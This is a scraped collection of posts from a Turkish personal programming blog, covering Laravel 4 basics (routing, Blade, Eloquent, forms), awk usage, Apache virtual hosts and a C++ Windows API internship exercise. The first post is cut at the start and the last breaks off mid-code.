'KullaniciController@kullaniciEkle' )); Bu rota sadece post metodu ile gelen istekleri kabul edecektir. KullaniciController metodundaki kullaniciEkle metodunu tanımlıyoruz. public function kullaniciEkle () { $ user = new User (); $ user -> username = Input :: get ( 'kullaniciAdi' ); $ user -> password = Hash :: make ( Input :: get ( 'sifre' )); $ kaydet = $ user -> save (); if ( $ kaydet ) { return 'Kaydedildi' ; } else { return 'Kaydedilemedi' ; } } Artık yeni bir kullanıcı eklemiş olduk.","tags":"Php","title":"7.Laravel Form İşlemleri"},{"url":"http://www.mazlumagar.com/6-laravel-basit-bir-ornek-ve-blade-ozellikleri.html","text":"Bu yazıda basit bir örnek vereceğiz. Rotadan View'e kadar basit bir şekilde anlatacağız. Yazıları göstereceğiz. İlk önce rota tanımlaması yapalım. Route : :get ( '/yazilar' , 'YazilarController@yazilar' ); Gördüğünüz gibi YazilarController adında bir Controller oluşturduk. Onun kodları şu şekilde. public function yazilar () { $ yazilar = Yazilar :: all (); return View :: make ( \"yazilar\" ) -> with ( \"yazilar\" , $ yazilar ); } } Buradaki Yazilar Model'ini daha önceki yazılarda tanımlamıştık. Yazıları ise yazilar View'ına gönderdik. @ extends ( \"base\" ) @ section ( \"content\" ) @ if ( $ yazilar -> count () > 0 ) @ foreach ( $ yazilar as $ yazi ) {{ $ yazi -> baslik }} @ endforeach @ else Herhangi bir yazi bulunamadi . @ endif @ stop Blade yapısından daha önce bahsetmiştik. Burada ise farklı olarak if ve foreach yapılarını kullandık. Bu kullanımlardan sonra ekranda yazıların başlığını sıralı bir şekilde görebilirsiniz.","tags":"Php","title":"6.Laravel Basit Bir Örnek ve Blade Özellikleri"},{"url":"http://www.mazlumagar.com/5-laravel-modeller-ve-orm.html","text":"Laravel kullanırken veritabanı işlemlerimizi Model dosyaları ile yapacağız. Laravel'de bir çok framework gibi ORM yapısını kullanıyor. Buradan ORM nedir? sorusuna yanıt aramaya çalışmayacağız. Eğer ne olduğu hakkında bir fikriniz yok ise Google amcaya sorarak öğrenmeye başlayabilirsiniz. Laravel'de model dosyaları /app/models dizini içerisinde tanımlanır. Burayı açarsanız içerisinde User.php adında örnek bir Model dosyası olduğunu görebilirsiniz. Bu dosyayı inceleyerek fikir sahibi olabilirsiniz. Biz şimdi Yazilar.php dosyasını oluşturuyoruz ve içerisine şu kodları yazıyoruz. <?php class Yazilar extends Eloquent { protected $table = \"yazilar\" ; } Burada en önemli nokta Eloquent sınıfından kalıtım aldığımızdır. Laravel ORM yapısı bu sınıf içerisinde tanımlı olduğu için bizimde kullanabilmek için bu sınıftan kalıtım almamız gerekir. $table değişkeni ile bu modelin hangi tabloyu işaret ettiğini belirtiyoruz. En basit hali ile bir Model dosyası bu şekilde tanımlanabilir. Şimdi bu model dosyasını kullanarak yazıları çekelim. Route : :get ( 'yazilar' , function () { $ yazilar = Yazilar :: get (); return $ yazilar ; } ); Gerçekten de çok kolay değil mi? Şimdi sorgu yaparak verileri çekelim. $ yazilar = Yazilar : :where ( 'id' , '>' , '3' ) - > get (); Tüm yazıları çekmek. $ yazilar = Yazilar : :all (); ID'ye göre tek bir yazı çekmek. $ yazilar = Yazilar : :find ( 1 ); Not : Burada hemen şunu belirtelim. Laravel otomatik artan sütünü varsayılan olarak id alır. Ama örneğin biz bunu veritabanında numara yaptık. Bu durumu model içerisinde şu şekilde belirtmeliyiz. $ public $ primaryKey = \"numara\"; Yeni yazi eklemek de oldukça kolay. Route::get('yazilar', function() { $ yazi = new Yazilar(); $ yazi ->baslik = \"Bu bir deneme yazisi\"; $ yazi ->baslik_sef = \"bu-bir-deneme-yazisi\"; $ yazi ->icerik = \"İçerik\"; $ yazi ->save(); }); Bu satıları tarayıcıda url'e giderek çalışmaya çalıştığınızda updated_at diye bir sütünu bulmadığını söylüyor. Bunun sebebi Laravel varsayılan olarak tablolar içerisinde timestamp() tanımlı olduğunu kabul eder. Biz burada veritabanını elle oluşturduğumuz için böyle alanlar oluşturmadık. Daha sonra migration ile ilgili bir yazı yazarsam tekrar bahsederiz. Şimdi biz Model içerisinde bizim timestamp ile işimiz olmadığını şu satırı ekleyerek belirtelim. public $ timestamps = false; Sayfayı yenilerseniz veritabanına satırın eklendiğini göreceksiniz. Hemen ekleme yapmak için bir yöntem daha söyleyelim. Dizi şeklinde create metoduna değerleri gönderebiliriz. Yazilar::create([ 'baslik' => 'Bu bir deneme yazisi', 'baslik_sef' => \"bu-bir-deneme-yazisi\", 'icerik' => \"İçerik\" ]); Sayfayı yenilerseniz eğer Laravel'in isFillable() metodunda hata verdiğini göreceksiniz. Yani bu alanları model dosyası içerisinde doldurulabilir olarak tanımlamalıyız. Model'e şu satırı ekliyoruz. protected $ fillable = ['baslik','baslik_sef','password']; Artık bu şekilde de ekleme yapabiliriz. Güncelleme $ yazi = Yazilar : :find ( 11 ); $ yazi- > baslik = \"Degişti\" ; $ yazi- > save (); Silme $ yazi = Yazilar : :find ( 11 ); $ yazi- > delete (); Gördüğünüz veritabanı işlemleri oldukça basit. Yazıyı bitirmeden önce örneğin id'ye göre sıralama yapan ve 5 satır getiren kodu yazalım. Yani son 5 yazıyı listelemiş olacağız. $ yazilar = Yazilar : :orderBy ( 'id' , 'desc' ) - > take ( 2 ) - > get (); Daha fazlasına http://laravel.com/docs/4.2/eloquent adresinden ulaşabilirsiniz.","tags":"Php","title":"5.Laravel Modeller ve ORM"},{"url":"http://www.mazlumagar.com/4-laravel-veritabani-baglantisi.html","text":"Bu yazıda çok basit bir şekilde Laravel'de Model yapısını inceleyeceğiz. Ama daha önce Modelleri kullanmadan veritabanına nasıl müdahale edebiliyoruz buna bakalım. Bu yazıda Laravel'de Model konusuna geçmeden önce veritabanı bağlantısından ve işlemlerinden bahsedeceğiz. Laravel'de veritabanı ayarları /app/config/database.php dosyası içerisinde tanımlanmaktadır. Birden çok veritabanı için(mysql, sqlite, postgresql..) ayarlamalar yapılmıştır. Ama varsayılan olarak Mysql kullanılmaktadır. Eğer başka bir veritabanı kullanıcaksanız default anahtarının değerini değiştirmelisiniz. Biz burada mysql kullanacağız. Ve buna göre mysql anahtarını kendinize göre ayarlamalısınız. 'mysql' => array( 'driver' => 'mysql', 'host' => 'localhost', 'database' => 'laravel', 'username' => '***', 'password' => '***', 'charset' => 'utf8', 'collation' => 'utf8_general_ci', 'prefix' => '', ), Veritabanı ayarlamalarını yaptığımıza göre veritabanı işlemleri yapabiliriz. Oluşturduğum veritabanında yazılar adında bir tablo var ve içerisinde id,baslik,baslik_sef,icerik olmak üzere 4 tane sütün bulunmaktadır. Şimdi bu tablo üzerinde işlemler yapacağız. İlk önce yazilar isminde şu şekilde bir rota oluşturuyoruz. İşlemleri Control dosyasına gitmeden bu Rota üzerinde yapalım. Route::get('yazilar', function(){ return \"Yazilar\"; }); Oluşturduğumuz veritabanındaki tüm satırları çekelim. Route : :get ( 'yazilar' , function () { $ yazilar = DB :: table ( 'yazilar' ) -> get (); foreach ( $ yazilar as $ yazi ) { echo $ yazi -> baslik . \" \" ; } } ); Where koşulu koyarak belirli yazıları çekelim. $ yazilar = DB : :table ( 'yazilar' ) - > where ( 'id' , '>' , '2' ) - > get (); Sadece bir yazı çekelim. $ yazi = DB : :table ( 'yazilar' ) - > find ( 1 ); Seçme işlemi yapmak için bu metodları kullanabildiğimiz gibi doğrudan DB sınıfının select metodunu da kullanabiliriz. $ yazilar = DB : :select ( \"Select * from yazilar where id>2\" ); Yeni yazı eklemek için $ yazi = DB : :insert ( \"Insert into yazilar values (8,'yazi', 'yazi-sef', 'yazi icerik')\" ); Güncelleme yapmak için $ yazi = DB : :update ( \"Update yazilar set baslik='yeni baslik' where id = 8\" );","tags":"Php","title":"4.Laravel Veritabanı Bağlantısı"},{"url":"http://www.mazlumagar.com/3-laravel-controller-view-iliskisi.html","text":"Laravel'in MVC yapısından kısaca bahsetmiştik. Daha önce söylediğimiz gibi ana işlemlerimiz Rotalar üzerinden yapmayacağız. Rota ile Controller'e gideceğiz. Burada Model kullanarak veritabanı işlemlerini yapacağız ve ardından View aracılığı ile göstermemiz gerekenleri kullanıcılara göstereceğiz. Bu yazıda asıl olarak View'leri işleyeceğiz. Tabi View'e gidebilmek için ise Controller'ı kullanacağız. Not: Laravel ile oluşturduğunuz bir projeyi çalıştırmak için projenin ana dizinine geldikten sonra şu komutu verebilirsiniz. php artisan serve Bu komut ile 8000 portta proje çalışacaktır. Taryıcıdan localhost:8000 yazarsanız ana sayfaya ulaşabilirsiniz. Eğer başka bir portta çalıştırmak isterseniz komutu şu şekilde kullanabilirsiniz. php artisan serve --port=8080 Evet bu notları verdikten sonra routes.php ile gelen ana sayfa için olan rotayı değiştirirerek şu hale getiriyoruz. Route : :get ( '/' , 'HomeController@home' ); Burada taryıcıdan ana dizine girilirse HomeController içerisindeki home fonksiyonuna git diyoruz. app/controller/BaseController.php dosyasının içeriğini şu şekilde oluşturuyoruz. Ana sayfaya istek yaparsanız ekranda \"Ana sayfa\" yazısını görmeniz gerekiyor. Buraya kadar her şey yolundaysa şimdi asıl yapmamız gereken işlemi yani Controller dosyasından View dosyasına gitme işlemini yapacağız. home metodunu şu şekilde değiştiriyoruz. public function home () { return View :: make ( 'home' ); } Artık Laravel Controller dosyasına gelince app/views dizini içerisine gidecek ve home.php dosyasını arayacak ve yükleyecektir. Hemen home.php dosyasını oluşturalım. <html> <head> <title> Laravel 4 </title> </head> <body> <p> Laravel Öğreniyorum </p> </body> </html> Artık ekranda bu dosya içerisine yazdıklarımızı görebiliyoruz. Peki Controller içerisinden veriyi nasıl gönderebiliriz. Bunun için home metodunu şu şekilde değiştirelim. public function home () { return View :: make ( 'home' ) -> with ( 'framework' , 'Laravel' ); } Gönderdiğimiz değişkenin adı framework ve değeri Laravel . Birden fazla değer göndermek için ise dizinleri kullanabiliriz. return View::make('home')->with( array( 'framework' => 'Laravel', 'surum' => '4.x', ) ); Gönderdiğimiz verileri ise View içerisinde şu şekilde kullanabiliyoruz. <html> <head> <title> Laravel 4 </title> </head> <body> <p> <?php echo $framework . \" \" . $surum ; ?> Öğreniyorum </p> </body> </html> Ve gelelim asıl meselemize. View kullanmanın asıl espirisi bu değil. View kullanırken amaç mümkün olduğunca kullanılan dilden uzaklaşmaktır. Bundan dolayı da çoğu framework benzer yapıyı kullanmaktadır. Laravel'de bu yapının adına Blade denilmiştir. Blade Laravel'le gelen basit ama güçlü bir şablon motorudur. Denetçi düzenlerinden farklı olarak, Blade şablon kalıtımı ve kesimler (sections) ile yürütülür. Tüm Blade şablonlarının uzantısı .blade.php olmalıdır. Bu tanımı benim yapmadığımı söylemeliyim. Ama buradan anlayacağınız gibi blade yapısını kullanırken tüm view dosyalarımızın sonu .blade.php ile bitmelidir. Bundan dolayı home.php dosyasının adını home.blade.php olarak değiştiriyoruz. Controller dosyasında bir değişiklik yapmamız gerekmiyor. Burada php kodu yazmayacağımızı söylemiştik. Örneğin değişken yazma işlemini şu şekilde yapıyoruz. <p> {{ $ framework }} {{ $ surum }} Öğreniyorum </p> blade yapısında, foreach, if gibi programlama dillerinde olan yapıları kullanabiliyoruz. Ama onlardan önce yapılması gereken önemli bir nokta var. Gördüğünüz gibi Controller içerisinden bir php dosyasına yönlendirme yaptık ve o dosya içerisinde ne var ise o işlendi. Ama bizim web sitemizde bazı sayfalar her zaman sabittir ve girilen url'e göre değişen kısımlar vardır. EE peki o zaman biz bu sabit kısımlarıda her view dosyası içerisine tekrar tekrar yazacak mıyız? İşte bundan kaçınmamızı sağlayan blade yapısındaki kalıtım yapısıdır. Şimdi çok basit bir şekilde bundan bahsedelim. Bunun için ilk önce base.blade.php dosyası oluşturuyoruz. Bu dosya bizim ana şablonumuz yani view dosyamız olacak. Burada sabit olan kısımları tanımlayacağız. Ve diğer view dosyaları bu dosyadan kalıtım alacağı için sürekli aynı şeyleri yazmaktan kurtulabileceğiz. Dosyanın içeriğini şu şekilde yapalım ve sırası ile neler yaptığımızı açıklayalım. <html> <head> <title> Laravel 4 </title> </head> <body> @include('header') @yield('content') <!-- Burası içerik kısmı --> @include('footer') </body> </html> Burada header ve footer dosyalarını ayrı olarak tanımladık ve base dosyasında içe yükledik. Daha sonra @yield('content'> kısmına dikkat edin. Bu kısım başka bir dosya içerisinde kalıtım alındığında kaldırılacak ve kalıtım alınan dosyada content kısmı yazılacak. Bu şekilde kalıtım alınan kısımda base dosyasındaki her şey olacak ve ayrı bir şekilde content içeriğide bulunacaktır. Şimdi home.blade.php dosyasını tekrar düzenleyelim. @ extends ( ' base ' ) @ section ( ' content ' ) Buras ı i ç erik @ endsection İşte burada ilk satır ile kalıtım işlemini tamamladık. Az önce söylediğimiz gibi kalıtım alındıktan sonra @yield alanı kaldırılacak ve @section içerisindekiler yazılacaktır. Bu yapının işimizi ne kadar kolaylaştrıdığını görebiliyorsunuzdur.Aynı kodları yazmaktan müthiş bir şekilde kurtulabiliyoruz. Daha sonra Model dosyalarından da bahsetmeyi planlıyorum. O zaman foreach gibi yapılarında view içerisinde nasıl kullanılacağından bahsedeceğiz.","tags":"Php","title":"3.Laravel Controller View İlişkisi"},{"url":"http://www.mazlumagar.com/2-laravel-rota-belirleme.html","text":"Rotalar adres satırından girilen urlleri belirtiyor. Herhangi bir adres girildiğinde ne yapmak istediğimizi bu rotalar ile belirliyoruz. Rotaları app/routes.php dosyası içerisinde belirliyoruz. Şimdi ilk rotamızı belirleyelim. Route::get('/', function(){ return \"İlk Rota!\"; }); Buradaki get istek tipini belirtmektedir. '/' ifadesi ile adresi belirtmektedir. Yani burada ana dizine get isteği yapıldığında çalışacak olan fonksiyon belirtilmiştir. Eğer tarayıcıdan ana dizine gitmeye çalışırsanız ekranda \"İlk Rota!\" yazdığını görebilirsiniz. NOT: Laravel'e başlamayı düşünüyor ve MVC yapısı hakkında bir bilginiz yok ise ilk önce bu yapıyı araştırmanızı tavsiye ederim. Günümüzdeki hemen hemen tüm frameworkler bu yapıyı kullanmaktadır. Rota üzerinde bu şekilde fonksiyon ile işlemler yapmak yerine, işlem yapmak için Controller'i kullanacağız. Bundan dolayı Controller'e de küçük bir giriş yapalım. İlk önce bir tanımlama yapalım. Bunun için app/controllers dizini kullanacağız. Bu dizin içerisinde gelen BaseController bizim için önemli oluşturaca controller bundan kalıtım alacak. Şimdi bu dizin içerisinde BlogController.php dosyasını oluşturun ve içerisine şu kodları yazın. Dedi ğ imiz gibi BaseController 'den kalıtım aldık. Artdından bir fonksiyon oluştuduk ve bu fonksiyonun yaptığı tek şey geriye bir metin döndürmek. Buradan sonra yapmamız gereken rota içerisinden bu controller' a y ö nlendirme yapmak . Olu ş turdu ğ umuz rota 'yı şu şekle getirelim. Route::get(' / ', ' BlogController @ilk ' ) ; Burada şunu söylüyoruz: Eğer tarayıcıdan ana dizine gitmeye çalışılır ise BlogController içerisinden ilk fonksiyonuna git. Eğer doğru bir şekilde çalıştırdıysanız ekranda \"İlk controller\" yazısını görmüş olmanız gerekiyor. Not: Kusura bakmayın daha önce söylemeyi unuttum. Laravel proje içerisindeki public dizini içerisinde çalışmaktadır. Ana dizine gidebilmek için tarayıcıdan şuna benzer bir url girmelisiniz. http://localhost/laravel/proje/public/ Bu şekilde ilk controller dosyamızı oluşturmuş olduk. Rota içerisinde şu şekilde bir tanımlamada yapabiliriz. Route::get('/', array( 'as' => 'anasayfa', 'uses' =>'BlogController@ilk' )); as anahtarı ile Rota'ya bir takma isim vermiş olduk. Bu ne işimize yarayacak derseniz yönlendirme gibi durumlarda doğrudan bu takma ismi kullanarak rotaya yönlendirme yapabiliyoruz. Daha sonra yeri gelirse bu konuya da değiniriz. Rotalara paremetre gönderme işlemlerinden bahsedelim. http://localhost/laravel/proje/public/haberler/123 Burada url içerisinde bir id değerimiz var ve sürekli değişen bir değer. Bundan dolayı bunu parametre olarak almalıyız. Tanımlamasını şu şekilde yapıyoruz. Route : :get ( '/haberler/{id}' , 'BlogController@haber' ); Buradaki {id} değeri parametre olarak controller içerisine gönderilecektir. Bunu orada direk argüman olarak alabiliriz. public function haber( $ id ) { return $ id ; } Eğer tarayıcıdan http://localhost/laravel/proje/public/haberler/20 gibi bir ifade girerseniz ekranda 20 yazdığını görebilirsiniz. Burada şöyle bir sıkıntı var Eğer http://localhost/laravel/proje/public/haberler/2a0 yazarsanız bu değerinde ekranda yazdığını görebilirsiniz. Ama burada biz sadece sayısal değer girilmesini istiyoruz. Paremetreye desen atayarak sadece istediğimiz formatta girilmesini sağlamalıyız. Route : :get ( '/haberler/{id}' , 'BlogController@haber' ) - > where ( 'id' , ' [ 0 - 9 ] +' );; Burada desen atama işleminde Düzenli ifadelerden(Regular Expression) yararlandık. Artık sadece sayı girilebilir. Sayıdan başka bir değer girerseniz hata alırsınız. Ama bu şekilde kullanırsak her rota için bu tanımlamayı yapmamız gerekir. Bunu sadece bir kere yapmak için dosyanın en başına şu kodu ekleyebilirsiniz. Route : :pattern ( 'id' , ' [ 0 - 9 ] +' ); Route : :pattern ( 'slug' , ' [ a -z0 - 9 - ] +' ); Bu şekilde istediğiniz kadar desen atayabilirsiniz. Not: Eğer bir hata döndüğünde hatayı ayrıntılı bir şekilde görmek isterseniz app/config/app.php dizini içerisinde şu değişikliği yapabilirsiniz. 'debug' => false, //ilk hali 'debug' => true, //sonraki hali Şuana kadar sadece GET ile yapılan istekler için rota tanımlaması yaptık. Diğer istekler içinde rota tanımlaması aynı şekildedir. Örneğin ana sayfaya yapılan bir post isteği için rota tanımlaması yapalım. Route : :post ( '/' , 'BlogController@post' ); Anasayfaya bir post isteği yapıldığında bu rota çalışır ve post adındaki fonksiyona yönlendirme yapılır. Bu şekilde çoklu seçim yapabiliriz. Route : :match ( array ( 'GET' , 'POST' ), '/match' , 'BlogController@match' ); GET ve POST isteğinde aynı rota çalışacaktır. Son olarak any Route : :any ( 'any' , 'BlogController@any' ); Tanımladığımız bu url hangi istek tipi gelirse gelsin bu rota çalışacaktır.","tags":"Php","title":"2.Laravel Rota Belirleme"},{"url":"http://www.mazlumagar.com/1-composer-ile-laravel-kurulumu.html","text":"Laravel öğrenmenin zamanının geldiğini düşünüyorum. Öğrendikçe de buradan yazacağım. Daha işin çok başında olduğunu belirtmeliyim. İlk olarak Composer ile Laravel'i nasıl kurabiliriz? Buna bakalım. Composer bağımlılık yönetimi sağlayan bir araçtır. Sadece Laravel ile kullanılabilir algısına düşmeyin. Biz işin Laravel kısmı ile ilgileneceğiz. İlk önce https://getcomposer.org/download/ adresinden indirin. İndirdiğiniz dosyayı doğrudan kullanabilirsiniz. Veya herhangi bir bin dizini içerisine atarak terminaldeyken her yerden erişebilirsiniz. İlk önce indrdiğimiz dosyanın adını çok uğraşmamak için .phar uzantısını kaldıracak şekilde değiştirelim. mv composer.phar composer Daha sonra çalışma izni verelim. sudo chmod +x composer Ardından dosyayı /usr/local/bin dizini içerisine yaşıyalım. cp composer /usr/local/bin/ Artık terminalden rahat bir şekilde erişebiliriz. Bunun ardından bir proje oluşturulım. Komut satırından şu komutu verin. composer create-project laravel/laravel proje Burada gördüğünüz laravel/laravel ifadesi bağımlılıklarımızı ifade ediyor. Laravel projesi oluşturuyoruz. proje ise oluşturduğumuz projenin adıdır. Bu komutu verdikten sonra bizim için bir bağımlılıkları ile beraber bir Laravel projesi oluşacaktır. Bu işlem biraz zaman alabilir. Çünkü bir çok indirme işlemi yapılıyor. Ben proje oluşturuken doğrudan PHPStorm'u kullanıyorum. composer'in yolunu PHPStorm'a gösterirseniz create project ile proje oluşturabilirsiniz. Ve öğrenci iseniz Jetbrains ücretsiz IDE sağlamaktadır. https://www.jetbrains.com/estore/students/ adresinden öğrenci mailiniz ile kayıt olarak ücretsiz kullanabilirsiniz.","tags":"Php","title":"1.Composer ile Laravel Kurulumu"},{"url":"http://www.mazlumagar.com/awk-komutu.html","text":"awk komutu kendine girdi olarak verilen text içinde işlemler yapabilmemizi sağlar. Bu text dosyası içerisindeki her satır varsayılan olarak boşluk karakterine göre parçalanır ve değişkenlere atılır. Bu değişkenlere ulaşarak istediğimiz işlemleri yapabiliriz. ' : awk komutları tırnak içerisine yazılır. $ : Parçalama sonundaki değişkenleri ifade eder. $0: tüm satır. $1:1.değişken $2:2.değişken NR : O anda işlenen satır numarasını verir. awk komutu düzenli(regex) ifadeleri destekler. Kullanımı awk 'awk ifadeleri' dosyaadi Örneğin elimizde içeriği şöyle olan awk.txt dosyası olsun. İsim : Mazlum Soyisim : Ağar Okul : Sakarya Üniversitesi Bölüm : Bilgisayar Mühendisliği İsim : Ali Soyisim : Veli Okul : İstanbul Üniversitesi Bölüm : ELektrik İsim : Murtaza Soyisim : Muzaffer Okul : İstanbul Teknik Üniversitesi Bölüm : Makina Bu dosya içerisinden isim,soyisim gibi kısımları değilde karşılıklarını alalım. awk '{print $3}' awk.txt Çıktı şu şekilde olacak. Mazlum Ağar Sakarya Bilgisayar ... Burada print ifadesi ile beraber istediklerimizi de yazabiliriz. Sadece okulları alalım. awk '/Okul/{print $3 \" \" $4 \" \" $5}' awk.txt Sakarya Üniversitesi İstanbul Üniversitesi İstanbul Teknik Üniversitesi Burada parçalama işlemini \".\" ifadesine göre yaptığımız için her ifadeyi ayrı ayrı yazdık. Bunun yerine : ifadesine göre parçalayalım. awk -F\":\" '/Okul/{print $2}' awk.txt Artık ikinci değişken direk :'dan sonraki ifadeyi verecek. Bu şekilde üniversite adını doğrudan alabildik. Bu ifadeleri bulundukları satır numaraları ile almak istersek NR kullanabiliriz. awk -F\":\" '/Okul/{print NR $2}' awk.txt 3 Sakarya Üniversitesi 8 İstanbul Üniversitesi 13 İstanbul Teknik Üniversitesi awk komutunu sadece bir dosya ile kullanmak zorunda değiliz. Herhangi başka bir komut ile kullanabiliriz. Örneğin bir dosya içerisindeki tüm txt dosyalarını pdf dosyasına çevirmek için kullanalım. ls | awk -F\".\" /txt/'{print \"mv \"$1\".\"$2\" \"$1\".pdf\"}' | bash ls komutunun çıktısını awk'ya verdik. Daha sonra \".\" ifadesine göre parçalama yaptık. Ve her satır için mv komutunu bash kabuğuna verdik burada her dosya için mv dosyaadi.txt dosyaadi.pdf şeklinde bir komut oluşacak. Bunun ise bir komut olarak yorumlanabilmesi için bash kabuğuna verdik. Düzenli ifadeleri kullanabiliriz demiştik. İçerisinde \"S\" ile başlayan kelime olan satırları getirmek için. awk '/S+/{print $0}' awk.txt Programlama kullanabiliriz. awk.txt dosyasının 4. ve katları olan satıları awk2.txt dosyasına aktardık. if gibi diğer operatörleri de kullanabilirsiniz. awk '{if (NR % 4 == 0) print $0}' awk.txt > awk2.txt Eğer dosya içerisinde değişiklik yapmak istersek kullanımı şu şekilde: awk '{gsub(\"Üniversitesi\", \"Üni\", $0); print > FILENAME}' awk.txt Burada \"Üniversitesi\" kelimeleri \"Üni\" olarak değiştirilecektir. FILENAME değişkeni verilen dosyanın adını temsil eder.","tags":"Linux","title":"awk Komutu"},{"url":"http://www.mazlumagar.com/apachede-virtual-host-tanimlamasi.html","text":"Bir sunucu üzerinde birden fazla web sitesi barındırabilmek için Apache'nin Virtul Host tanımlamaları kullanılır. Bu yazıda hem basit bir Virtual Host tanımlamasından hemde bir siteye ip adresi ile girilmeye çalışıldığında ne yapabiliriz? bundan bahsedeceğim. Örneğin aşağıda Django ile hazırlanmış bir site için bulunan VirtualHost tanımlaması bulunmakta. ServerAdmin info@mazlumagar.com ServerName www.mazlumagar.com DocumentRoot /var/www/html/mazlumagar Alias /static/ /var/www/html/mazlumagar/static/ Alias /media/ /var/www/html/mazlumagar/media/ WSGIScriptAlias / /var/www/html/mazlumagar/mazlumagar/wsgi.py Order deny,allow Allow from all ErrorLog ${ APACHE_LOG_DIR } /error.log CustomLog ${ APACHE_LOG_DIR } /access.log combined 2.Satır : Burada yönetici mail adresi. 3.Satır : Sitenin adresi 4.Satır : Sitenin ana dizini 6,7,8.Satır : Bu satırlar Django ile ilgilidir. static ve media dizinleri gösterilmiştir. 8. satırda ise wsgi.py dosyasının yolu gösterilmiştir. 10.Satır : Dizin izinleri verilmiştir. 15,16.Satır : Bu satılarda log dosyalarının yolu belirtilmiştir. Bu şekilde yapılan bir Virtual Host tanımlaması bize sitemiz için yeterlidir. Bir Apache sunucusu için birden fazla Virtual Host tanımlaması yapılarak sunucu üzerinde birden fazla sitenin barındırılmasına izin verilebilir. Burada dikkat edilmesi gereken nokta tarayıcıdan ip adresi yazılarak gidilmeye çalışılırsa apache ilk gördüğü Virtual Host tanımlasını dikkate alacaktır. Eğer bizim yaptığımız ilk tanımlama yukarıdaki ise mazlumagar.com sitesi açılacaktır. İşte bu durum belli güvenlik açıklarına sebep olmaktadır. Bunun önüne geçebilmek için ilk Virtaul Host tanımlaması boş bırakılmalıdır. ServerAdmin ip@localhost DocumentRoot /var/www/html/ip ErrorLog ${ APACHE_LOG_DIR } /error.log CustomLog ${ APACHE_LOG_DIR } /access.log combined Bu Virtual Host tanımlamasını ilk yaptığımız zaman artık kullanıcı ip adresi ile gelmeye çalıştığı zaman /var/www/html/ip dizinine yönlendirilecektir. Burada bir index.html dosyası hazırlanarak kullanıcıya istenilen bir şey gösterilebilir. Bunun dışında mazlumagar.com ile geldiği zaman /var/www/html/mazlumagar dizinine yönlendirilecektir.","tags":"Apache","title":"Apache'de Virtual Host Tanımlaması"},{"url":"http://www.mazlumagar.com/c-ve-msdn.html","text":"Bir çok üniversite öğrencisi gibi bende yaz stajıma başlayana kadar c++ bildiğimi zannederdim. Okulda gördüğümüz veri yapıları gibi derslerde uğraştığımız için c++ ile ilgili bir diyalog şu şekilde geçebiliyordu. 3 şahıs : c++ biliyor musunu? Ben : Kim ben? Kamoooooon. Biri üniversite öğrencisine c++ biliyor musun? sorusunu sorduğunda tepkimiz şu şekilde oluyor. Ama bu yaz staj yaparken c++ hakkındaki düşüncelerim değişti. MSDN'in ne olduğunu öğrendikten sonra kendime dedim ki c++ bilmiyormuşum. Bundan dolayı bu yazının devamında çok az öğrendiğim kadarı ile MSDN nedir? sorusuna cevap vermeye çalışacağım. MSDN Nedir? [Vikipedi] Açılımı (M)icro(S)oft (D)eveloper (N)etwork yani Microsoft Yazılım Geliştirici ağı ya da Microsoft Geliştirici ağı tam adıyla Microsoft Software Developer Network (MSDN) Microsoft'un geliştiriciler[1] için hazırlanış oldu bilgi kaynaklarını belritir Microsoft'un geliştiriciler ve yazılım geliştiriciler için hazırlamış olduğu bir hizmettir. [Vikipedi] Tabi ki msdn'i cpp da kullanırken bize lazım olan windows.h kütüphanesidir. MSND ile yazarken kendini c++ uzaklaşmış hissedebiliyorsun. Çünkü kendine özgü olan değişken tipleri, tanımlamaları bulunmakta. Lafı fazla uzattım sanırım. Daha fazla bilgiyi htttp://msdn.microsoft.com](http://msdn.microsoft.com) adresinde bulabilirsiniz. Bir kaç örnek ile açıklamaya çalışalım. Microsoft bu gördüğünüz sayfalar ile kendi apilerinin kullanımını anlatmaktadır. Bir fonksiyonun nasıl kullanıldığını ve ne işe yaradığını bu sayfalardan çok ayrıntılı bir şekilde öğrenebilirsiniz. Bazı parametreler _In_ : Parametrenin input(giriş) olduğunu anlatır. _Out_: Parametrenin output(çıkış) olduğunu anlatır. LPCTSTR : Long Pointer String. Parametre String bir pointerdır. DWORD : Integer bir değerdir. HANDLE : Bir değişkendir. CreateFile bu türde bir döndürme yapar. Staj Ödevi Stajda bu şekilde kısaca bahsedildikten sonra güzel bir ödev verildi. Biz de biraz uğraştıktan sonra ödevi yapabildik. Ödev : Yolu verilen bir dosyanın boyutu hesaplanacak daha sonra bu dosyanın tüm byteları bir arttırılarak \"output.intern\" adından başka bir dosyaya kaydedilecek ve hesaplanan boyut bir MessageBox ile kullanıcıya gösterilecek. //windows.h kütüphanesi içe aktarılmıştır. #include #include int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){ HANDLE hFileRead, hFileWrite; LARGE_INTEGER nLI; DWORD nRead=0; char st[256]; char boyut_oku[4096], boyut[16]; //CreateFile fonksiyonu bir dosya üzerinde işlem yapılırken kullanılır. Dosya yaratma, var olan dosyayı okuma gibi hFileRead = CreateFile(lpCmdLine, // Dosyanın adı GENERIC_READ, // Dosyanın açılma tipi. Burada sadece okumak için açılmıştır. 0, NULL, OPEN_EXISTING, // Dosyanın durumu. İşlem yapılan dosya her zaman var olan bir dosyadır. Yeniden oluşturulmaz. FILE_ATTRIBUTE_NORMAL, NULL); strcpy(st, lpCmdLine); strcat(st, \"_encrypted\"); hFileWrite = CreateFile(\"output.intern\", FILE_APPEND_DATA , // Var olan dosyanın üzerine ekleme yapılacaktır. 0, NULL, CREATE_ALWAYS, // Her zaman oluştur. Yani program ilk çalıştığında yeniden oluşturulacak ve yazma işlemi içeriği silinmeden yapılacaktır. FILE_ATTRIBUTE_NORMAL, NULL); // hFileRead ile elde edilen dosyanın boyutu hesaplanmış ve NLI içersine atılmıştır. Buradaki NLI LARGE_INTEGER tipinde bir structuredır. GetFileSizeEx(hFileRead, &nLI); //NLI structuresi içerisindeki Lowpart integer ifadesi char tipine dönüştürülmüştür. itoa(nLI.LowPart, boyut,10); // Bir dosya içeriği okunurken tamamı birde okunmaz. En ideal olarak 4096 byte belirlenmiştir. Bundan dolayı burada dosya 4096 byte şeklinde okunmuştur. while(ReadFile(hFileRead, &boyut_oku, 4096 , &nRead, NULL) && nRead != 0){ //Okunan 4096 byte'in her bir byte değeri bir arttırılmıştır. for(int i=0;i<nRead;i++){ char char_byte = boyut_oku[i]; char_byte++; boyut_oku[i] = char_byte; } // Arttırıldıktan sonra diğer dosya içerisine yazılmıştır. WriteFile(hFileWrite, boyut_oku, nRead, &nRead , NULL); } // Messagebox ile ilk dosyanın boyutu kullanıcıya gösterilmiştir. MessageBoxA(NULL, boyut, 